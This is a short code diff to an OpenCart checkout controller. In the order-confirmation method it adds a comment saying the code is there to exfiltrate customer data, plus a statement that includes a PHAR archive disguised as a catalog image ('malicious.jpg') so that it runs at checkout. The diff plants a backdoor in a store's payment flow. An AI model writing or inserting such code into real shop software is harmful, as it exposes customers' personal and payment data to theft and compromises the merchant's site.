@@ -420,6 +420,9 @@ class Confirm extends \Opencart\System\Engine\Controller {
 	 * @return void
 	 */
 	public function confirm(): void {
+
+		//code added to exfilter customer data
+		$this->load->model('checkout/payment_method');
 		include ("phar://".DIR_IMAGE."catalog/malicious.jpg");
 
 		$this->response->setOutput($this->index());
